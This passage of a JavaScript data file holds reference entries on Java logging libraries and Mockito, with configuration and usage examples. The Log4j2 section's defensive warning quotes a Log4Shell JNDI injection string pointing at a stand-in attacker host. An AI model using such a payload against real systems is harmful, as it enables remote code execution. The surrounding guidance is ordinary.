      code: "// GOOD (lazy - only builds the string if the level is enabled):\nlog.debug(\"user {} did {}\", userId, action);\n// AVOID (always concatenates, even when debug is off):\n// log.debug(\"user \" + userId + \" did \" + action);"
    },
    {
      title: "Example 3: parameterized logging avoids string cost",
      description: "<p>Use <code>{}</code> placeholders so the message is only built when the level is enabled.</p>",
      code: "private static final Logger log = LoggerFactory.getLogger(MyClass.class);\n" +
        "\n" +
        "log.debug(\"processing order {} for {}\", orderId, userId); // lazy formatting\n" +
        "// vs the wasteful: log.debug(\"processing order \" + orderId + ...) which\n" +
        "// concatenates even when DEBUG is off."
    },
    {
      title: "Example 4 (edge case): one (and only one) binding on the classpath",
      description: "<p>SLF4J needs exactly one backend; zero gives a no-op logger, multiple cause a warning and unpredictable selection.</p>",
      code: "// Zero bindings:\n" +
        "//   SLF4J: No SLF4J providers were found -> logs silently go nowhere\n" +
        "// Multiple bindings:\n" +
        "//   SLF4J: Class path contains multiple SLF4J providers -> one picked at random\n" +
        "// Fix: depend on exactly one (e.g. logback-classic) and exclude transitive ones."
    }
  ],
  whenToUse: "<p>Always log through SLF4J (the facade), not directly against a specific framework &mdash; this " +
    "is the standard and lets you/your libraries choose the backend. <strong>Gotchas:</strong> use " +
    "<strong>parameterized logging</strong> (<code>{}</code> placeholders) so message strings are only built " +
    "when the level is enabled (performance). Don't log sensitive data (passwords, tokens, PII). Pick " +
    "appropriate levels (error/warn/info/debug/trace). You need exactly one SLF4J binding on the classpath " +
    "(Logback or Log4j2) &mdash; multiple bindings cause warnings/conflicts. Configure the actual backend " +
    "(format, levels, appenders) separately.</p>"
};

C["logback"] = {
  summary: "<p><strong>Logback</strong> is a popular, high-performance logging <em>implementation</em> and the " +
    "native/default backend for SLF4J (same author). It handles the actual log output: formatting, " +
    "filtering, routing to destinations (console, files, rolling files, remote), and is configured via XML " +
    "(<code>logback.xml</code>). It's the default logging backend in Spring Boot.</p>",
  examples: [
    {
      title: "Example 1: logback.xml configuration",
      description: "<p>Define appenders, pattern, and levels.</p>",
      code: "<configuration>\n  <appender name=\"CONSOLE\" class=\"ch.qos.logback.core.ConsoleAppender\">\n    <encoder><pattern>%d %-5level %logger - %msg%n</pattern></encoder>\n  </appender>\n  <root level=\"INFO\">\n    <appender-ref ref=\"CONSOLE\"/>\n  </root>\n</configuration>"
    },
    {
      title: "Example 2: Rolling file appender",
      description: "<p>Rotate logs by size/time.</p>",
      code: "<appender name=\"FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\">\n  <file>app.log</file>\n  <rollingPolicy class=\"...TimeBasedRollingPolicy\">\n    <fileNamePattern>app-%d{yyyy-MM-dd}.log</fileNamePattern>\n    <maxHistory>30</maxHistory>\n  </rollingPolicy>\n</appender>"
    },
    {
      title: "Example 3: rolling file appender in logback.xml",
      description: "<p>Logback's XML config defines appenders, patterns, and rotation policies.</p>",
      code: "<configuration>\n" +
        "  <appender name=\"FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\">\n" +
        "    <file>app.log</file>\n" +
        "    <rollingPolicy class=\"...TimeBasedRollingPolicy\">\n" +
        "      <fileNamePattern>app.%d{yyyy-MM-dd}.log</fileNamePattern>\n" +
        "      <maxHistory>30</maxHistory>\n" +
        "    </rollingPolicy>\n" +
        "    <encoder><pattern>%d %-5level %logger - %msg%n</pattern></encoder>\n" +
        "  </appender>\n" +
        "  <root level=\"INFO\"><appender-ref ref=\"FILE\"/></root>\n" +
        "</configuration>"
    },
    {
      title: "Example 4 (edge case): synchronous logging can throttle throughput",
      description: "<p>High-volume synchronous file logging blocks request threads; wrap appenders in an <code>AsyncAppender</code> (and beware lost logs on crash).</p>",
      code: "<appender name=\"ASYNC\" class=\"ch.qos.logback.classic.AsyncAppender\">\n" +
        "  <appender-ref ref=\"FILE\"/>\n" +
        "  <queueSize>512</queueSize>\n" +
        "  <discardingThreshold>0</discardingThreshold> <!-- 0 = don't drop on full -->\n" +
        "</appender>\n" +
        "<!-- Trade-off: async can lose buffered events on abrupt JVM exit. -->"
    }
  ],
  whenToUse: "<p>Use Logback (via SLF4J) as a solid default logging backend &mdash; it's mature, fast, and the " +
    "Spring Boot default. Configure appenders for console (dev) and rolling files (prod), set levels per " +
    "package, and consider structured (JSON) output for centralized logging. <strong>Gotchas:</strong> always " +
    "log through the SLF4J API, not Logback directly, so the backend stays swappable. Set up log rotation/" +
    "retention (unbounded logs fill disks). Don't log sensitive data. Tune levels (DEBUG in prod is noisy/" +
    "costly). For high-throughput async logging, configure an <code>AsyncAppender</code>. Logback vs Log4j2 " +
    "is largely preference; both are excellent.</p>"
};

C["log4j2"] = {
  summary: "<p><strong>Log4j 2</strong> is a powerful, high-performance logging framework &mdash; a successor " +
    "to the original Log4j. It offers asynchronous logging (via the LMAX Disruptor) for very high throughput, " +
    "flexible configuration (XML/JSON/YAML), plugins, and rich appenders. It can serve as an SLF4J backend " +
    "and is a leading alternative to Logback.</p>",
  examples: [
    {
      title: "Example 1: Async logging advantage",
      description: "<p>Log4j2 excels at high-throughput async logging.</p>",
      code: "// Log4j2's async loggers (LMAX Disruptor) give very high throughput\n//   and low latency - logging calls return almost immediately.\n// Use via SLF4J API (so code stays backend-agnostic):\nprivate static final Logger log = LoggerFactory.getLogger(MyClass.class);"
    },
    {
      title: "Example 2: Configuration (log4j2.xml)",
      description: "<p>Appenders + levels, like other frameworks.</p>",
      code: "<Configuration>\n  <Appenders>\n    <Console name=\"Console\"><PatternLayout pattern=\"%d %-5p %c - %m%n\"/></Console>\n  </Appenders>\n  <Loggers>\n    <Root level=\"info\"><AppenderRef ref=\"Console\"/></Root>\n  </Loggers>\n</Configuration>"
    },
    {
      title: "Example 3: async loggers for high throughput",
      description: "<p>Log4j2's LMAX Disruptor-based async loggers give very high throughput and low latency under load.</p>",
      code: "# Enable all-async via a system property:\n" +
        "-Dlog4j2.contextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector\n" +
        "\n" +
        "<!-- log4j2.xml -->\n" +
        "<Configuration>\n" +
        "  <Appenders><Console name=\"C\"><PatternLayout pattern=\"%d %p %c - %m%n\"/></Console></Appenders>\n" +
        "  <Loggers><Root level=\"info\"><AppenderRef ref=\"C\"/></Root></Loggers>\n" +
        "</Configuration>"
    },
    {
      title: "Example 4 (edge case): remember Log4Shell - keep it patched",
      description: "<p>The 2021 Log4Shell (CVE-2021-44228) RCE came from JNDI lookups in messages; use a patched version and disable lookups on untrusted input.</p>",
      code: "// Vulnerable pattern (old Log4j2): user input flowed into a message that\n" +
        "// triggered a JNDI lookup like ${jndi:ldap://attacker/...}\n" +
        "log.info(userControlledInput); // never log untrusted input via a format lookup\n" +
        "// Use Log4j2 >= 2.17.1; treat any logging dependency as a supply-chain risk\n" +
        "// and keep it current. Prefer parameterized messages over interpolating input."
    }
  ],
  whenToUse: "<p>Use Log4j2 (via SLF4J) when you want top-tier performance &mdash; especially its async logging " +
    "for high-throughput applications &mdash; or its flexible plugin/config system. It's a strong alternative " +
    "to Logback. <strong>Gotchas:</strong> remember <strong>Log4Shell (CVE-2021-44228)</strong> &mdash; a " +
    "critical RCE in older Log4j2; <em>keep it patched/updated</em> (a stark reminder to monitor dependency " +
    "vulnerabilities). Don't confuse Log4j2 with the long-dead Log4j 1.x (EOL, insecure). Configure log " +
    "rotation, avoid logging secrets, and use parameterized messages. Pick one backend (Log4j2 or Logback) on " +
    "the classpath, not both.</p>"
};

C["tinylog"] = {
  summary: "<p><strong>tinylog</strong> is a lightweight, minimalist logging framework for Java with a tiny " +
    "footprint and a very simple API (static logging methods, minimal configuration). It targets small " +
    "applications, libraries, and Android where simplicity and small size matter more than the extensive " +
    "features of Logback/Log4j2.</p>",
  examples: [
    {
      title: "Example 1: Dead-simple API",
      description: "<p>Static methods, no logger instances needed.</p>",
      code: "import org.tinylog.Logger;\nLogger.info(\"User {} logged in\", userId);   // static, parameterized\nLogger.error(exception, \"Failed to process\");\n// No LoggerFactory.getLogger(...) boilerplate per class."
    },
    {
      title: "Example 2: Minimal configuration",
      description: "<p>Small footprint, simple properties config.</p>",
      code: "# tinylog.properties\nwriter        = console\nwriter.format = {date} {level}: {message}\nlevel         = info\n// Far less configuration than Logback/Log4j2."
    },
    {
      title: "Example 3: tinylog's static logging API",
      description: "<p>tinylog uses a simple static <code>Logger</code> - no per-class logger instance to declare.</p>",
      code: "import org.tinylog.Logger;\n" +
        "\n" +
        "Logger.info(\"Started with {} workers\", count); // static call, lazy formatting\n" +
        "Logger.error(ex, \"Job {} failed\", jobId);      // exception + message\n" +
        "// Configured via a single tinylog.properties; no XML, tiny footprint."
    },
    {
      title: "Example 4 (edge case): small ecosystem and facade considerations",
      description: "<p>tinylog has fewer appenders/integrations than Logback/Log4j2; in a library, log through SLF4J instead so consumers choose the backend.</p>",
      code: "// In a LIBRARY you publish, don't hard-code tinylog - depend on slf4j-api so\n" +
        "// the consuming application picks the backend. tinylog shines in self-contained\n" +
        "// apps/CLIs where you control the whole dependency set and want minimal weight.\n" +
        "// Fewer third-party appenders (e.g. niche log aggregators) may be available."
    }
  ],
  whenToUse: "<p>Consider tinylog for small applications, libraries, CLIs, or Android where a small dependency " +
    "and minimal setup are priorities, and you don't need the advanced features of the big frameworks. " +
    "<strong>Gotchas:</strong> its <strong>ecosystem and feature set are much smaller</strong> than Logback/" +
    "Log4j2 (fewer appenders, integrations, community resources), and most enterprise Java uses SLF4J + " +
    "Logback/Log4j2 &mdash; so tinylog is less common and may not fit teams/frameworks expecting the " +
    "standard stack. Its static API also bypasses the SLF4J facade pattern. For typical Spring/enterprise " +
    "apps, stick with SLF4J + Logback/Log4j2; choose tinylog when minimalism genuinely matters.</p>"
};

C["mockito"] = {
  summary: "<p><strong>Mockito</strong> is the most popular Java <strong>mocking framework</strong>. It " +
    "creates fake (mock) implementations of dependencies so you can test a class in isolation &mdash; " +
    "stubbing method return values, verifying interactions, and avoiding real databases/services in unit " +
    "tests. It pairs with JUnit and is essential for fast, focused unit testing.</p>",
  examples: [
    {
      title: "Example 1: Mock, stub, verify",
      description: "<p>Control a dependency and assert how it was used.</p>",
      code: "@Test void placesOrder() {\n  OrderRepository repo = mock(OrderRepository.class);\n  when(repo.save(any())).thenReturn(savedOrder);   // stub\n  var service = new OrderService(repo);\n  service.place(request);\n  verify(repo).save(any(Order.class));             // verify interaction\n}"
    },
    {
      title: "Example 2: Stubbing exceptions + argument matchers",
      description: "<p>Simulate failures and match arguments.</p>",
      code: "when(gateway.charge(anyDouble())).thenThrow(new PaymentException());\nverify(emailService).send(eq(\"a@x.com\"), contains(\"receipt\"));\n// @Mock fields + @ExtendWith(MockitoExtension.class) reduce boilerplate."
    },
    {
      title: "Example 3: stub, verify, and argument capture",
      description: "<p>Define behavior with <code>when().thenReturn()</code>, then assert interactions with <code>verify()</code>.</p>",
      code: "PaymentGateway gw = mock(PaymentGateway.class);\n" +
        "when(gw.charge(anyInt())).thenReturn(true);   // stub\n" +
        "\n" +
        "new OrderService(gw).checkout(999);\n" +
        "\n" +
        "verify(gw).charge(999);                        // was it called with 999?\n" +
        "verify(gw, never()).refund(anyInt());          // and refund never called"
    },
    {
      title: "Example 4 (edge case): don't mock what you don't own / over-mocking",
      description: "<p>Mocking value objects or third-party types couples tests to implementation; and stubbing a method that's never called triggers a strict-stub error.</p>",
      code: "// Smell: mocking a simple value/DTO - just construct a real one.\n" +
        "// Smell: mocking a third-party class (e.g. the JDBC driver) - wrap it behind\n" +
        "//        your own interface and mock THAT.\n" +
        "when(gw.refund(1)).thenReturn(true); // if refund() is never called ->\n" +
        "//   UnnecessaryStubbingException (Mockito strict stubs). Remove unused stubs.\n" +
        "// Tests full of mocks often test the mocks, not the behavior - prefer real\n" +
        "// collaborators where cheap."
    }
  ],
  whenToUse: "<p>Use Mockito in unit tests to isolate the class under test from its collaborators (DBs, APIs, " +
    "services) &mdash; stub their behavior and verify interactions, keeping tests fast and deterministic. " +
    "<strong>Gotchas:</strong> <strong>don't over-mock</strong> &mdash; mocking everything tests the mocks, " +
    "not real behavior; mock external/slow dependencies, use real objects for simple collaborators. Verifying " +
    "too many interactions makes tests brittle (couples to implementation). Mockito can't mock static/final " +
    "easily (older versions) &mdash; usually a design hint to inject dependencies. Prefer constructor " +
    "injection so mocks are easy to supply. Combine with JUnit + AssertJ for clean, focused unit tests.</p>"
};
